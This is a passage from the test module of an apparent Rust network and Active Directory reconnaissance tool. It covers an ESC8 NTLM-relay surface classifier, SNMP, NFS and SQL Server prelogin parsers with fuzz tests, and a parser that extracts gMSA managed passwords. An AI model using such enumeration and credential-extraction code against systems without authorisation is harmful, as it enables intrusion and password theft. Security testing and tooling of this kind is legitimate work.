                    Err(e) => eprintln!("  {}: {e}", c.sam),
                }
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod net_tests {
    use super::*;

    #[test]
    fn esc8_classifier() {
        let vuln = "HTTP/1.1 401 Unauthorized\r\nServer: Microsoft-IIS/10.0\r\nWWW-Authenticate: Negotiate\r\nWWW-Authenticate: NTLM\r\n\r\n";
        assert!(is_esc8_response(vuln), "cleartext NTLM 401 = ESC8");
        // 200 (anonymous), or a 401 without NTLM (e.g. Basic only), is not the ESC8 surface.
        assert!(!is_esc8_response("HTTP/1.1 200 OK\r\n\r\n"));
        assert!(!is_esc8_response(
            "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic\r\n\r\n"
        ));
    }

    #[test]
    fn ber_lengths() {
        assert_eq!(ber(0x02, &[0x2a]), vec![0x02, 0x01, 0x2a]);
        let long = vec![0u8; 200];
        let e = ber(0x04, &long);
        assert_eq!(&e[..2], &[0x04, 0x81]); // 1-byte extended length
        assert_eq!(e[2], 200);
        let longer = vec![0u8; 300];
        let e2 = ber(0x04, &longer);
        assert_eq!(&e2[..2], &[0x04, 0x82]); // 2-byte extended length
        assert_eq!(u16::from_be_bytes([e2[2], e2[3]]), 300);
    }

    #[test]
    fn rpc_record_marker_last_fragment() {
        let f = rpc_frame(&[1, 2, 3, 4]);
        assert_eq!(u32::from_be_bytes([f[0], f[1], f[2], f[3]]), 0x8000_0004);
        assert_eq!(&f[4..], &[1, 2, 3, 4]);
    }

    #[test]
    fn snmp_extracts_last_octet_string() {
        // Hand-build an SNMPv1 GetResponse and confirm the walker returns sysDescr, not community.
        let oid = ber(0x06, &[0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00]);
        let val = ber(0x04, b"Linux router 5.10");
        let vb = ber_seq(&[ber_seq(&[oid, val].concat())].concat());
        let pdu_body = [ber(0x02, &[0x2a]), ber(0x02, &[0]), ber(0x02, &[0]), vb].concat();
        let pdu = ber(0xa2, &pdu_body); // GetResponse
        let msg = ber_seq(&[ber(0x02, &[0]), ber(0x04, b"public"), pdu].concat());
        assert_eq!(
            snmp_first_octet_string(&msg).as_deref(),
            Some("Linux router 5.10")
        );
    }

    #[test]
    fn parse_exports_walks_chain() {
        fn be(v: u32) -> [u8; 4] {
            v.to_be_bytes()
        }
        let mut body = vec![0u8; 24]; // RPC accepted-reply header
                                      // export 1: "/data", no groups
        body.extend_from_slice(&be(1));
        body.extend_from_slice(&be(5));
        body.extend_from_slice(b"/data\0\0\0"); // padded to 8
        body.extend_from_slice(&be(0)); // group list end
                                        // export 2: "/exports", one group "*"
        body.extend_from_slice(&be(1));
        body.extend_from_slice(&be(8));
        body.extend_from_slice(b"/exports");
        body.extend_from_slice(&be(1)); // group present
        body.extend_from_slice(&be(1));
        body.extend_from_slice(b"*\0\0\0");
        body.extend_from_slice(&be(0)); // group list end
        body.extend_from_slice(&be(0)); // export list end
        let ex = parse_exports(&body);
        assert_eq!(ex, vec!["/data".to_string(), "/exports".to_string()]);
    }

    /// Tiny deterministic PRNG (xorshift64*) so any fuzz failure reproduces from its seed.
    struct Rng(u64);
    impl Rng {
        fn next(&mut self) -> u64 {
            self.0 ^= self.0 >> 12;
            self.0 ^= self.0 << 25;
            self.0 ^= self.0 >> 27;
            self.0.wrapping_mul(0x2545_F491_4F6C_DD1D)
        }
        fn bytes(&mut self, max: usize) -> Vec<u8> {
            let n = (self.next() as usize) % (max + 1);
            (0..n).map(|_| self.next() as u8).collect()
        }
    }

    /// Feed random + seed-mutated byte buffers to a parser; fail with a repro on any panic.
    fn fuzz<F: Fn(&[u8]) + std::panic::RefUnwindSafe>(name: &str, seeds: &[&[u8]], f: F) {
        let prev = std::panic::take_hook();
        std::panic::set_hook(Box::new(|_| {})); // silence expected-during-fuzz panic spew
        let mut rng = Rng(0x9E37_79B9_7F4A_7C15 ^ name.bytes().map(|b| b as u64).sum::<u64>());
        let mut fail = None;
        for _ in 0..200_000 {
            // Half pure-random, half a mutated copy of a valid seed.
            let mut buf = rng.bytes(320);
            if !seeds.is_empty() && rng.next() & 1 == 0 {
                let mut s = seeds[(rng.next() as usize) % seeds.len()].to_vec();
                for _ in 0..(rng.next() as usize % 8) {
                    if !s.is_empty() {
                        let i = (rng.next() as usize) % s.len();
                        s[i] = rng.next() as u8;
                    }
                }
                buf = s;
            }
            let b = buf.clone();
            if std::panic::catch_unwind(|| f(&b)).is_err() {
                fail = Some(buf);
                break;
            }
        }
        std::panic::set_hook(prev);
        if let Some(buf) = fail {
            panic!(
                "{name} PANICKED on input ({} bytes): {}",
                buf.len(),
                hex_dump(&buf)
            );
        }
    }

    fn hex_dump(b: &[u8]) -> String {
        b.iter().map(|x| format!("{x:02x}")).collect()
    }

    #[test]
    fn fuzz_network_parsers() {
        // These parse bytes from arbitrary remote hosts (SNMP/NFS/TDS) — must never panic.
        let snmp_seed = ber_seq(&[ber(0x02, &[0]), ber(0x04, b"public"), ber(0xa2, &[])].concat());
        fuzz("snmp_first_octet_string", &[&snmp_seed], |b| {
            let _ = snmp_first_octet_string(b);
        });
        let mut nfs_seed = vec![0u8; 24];
        nfs_seed.extend_from_slice(&[0, 0, 0, 1, 0, 0, 0, 5]);
        nfs_seed.extend_from_slice(b"/data\0\0\0");
        fuzz("parse_exports", &[&nfs_seed], |b| {
            let _ = parse_exports(b);
        });
        fuzz("parse_prelogin", &[], |b| {
            let _ = parse_prelogin(b);
        });
    }

    #[test]
    fn managed_password_blob_extracts_current() {
        let mut b = vec![1, 0, 0, 0]; // version + reserved
        b.extend_from_slice(&0u32.to_le_bytes()); // length
        b.extend_from_slice(&16u16.to_le_bytes()); // CurrentPasswordOffset
        b.extend_from_slice(&0u16.to_le_bytes()); // PreviousPasswordOffset = none
        b.extend_from_slice(&0u16.to_le_bytes()); // QueryPasswordInterval
        b.extend_from_slice(&0u16.to_le_bytes()); // UnchangedPasswordInterval
        b.extend_from_slice(&[0xAB; 256]); // CurrentPassword
        let pw = parse_managed_password_blob(&b).unwrap();
        assert_eq!(pw.len(), 256);
        assert!(pw.iter().all(|&x| x == 0xAB));
    }

    #[test]
    fn prelogin_reads_version_and_encryption() {
        // VERSION @12 (16.0.1000), ENCRYPTION @18 = 0x03 (REQUIRED).
        let mut body = vec![
            0x00, 0x00, 12, 0x00, 6, // VERSION token
            0x01, 0x00, 18, 0x00, 1,    // ENCRYPTION token
            0xff, // terminator
        ];
        while body.len() < 12 {
            body.push(0);
        }
        body.extend_from_slice(&[16, 0, 0x03, 0xe8, 0, 0]); // 16.0.1000
        body.push(0x03); // ENCRYPT_REQ
        let (v, e) = parse_prelogin(&body);
        assert_eq!(v.as_deref(), Some("16.0.1000"));
        assert_eq!(e, Some(0x03));
    }
}
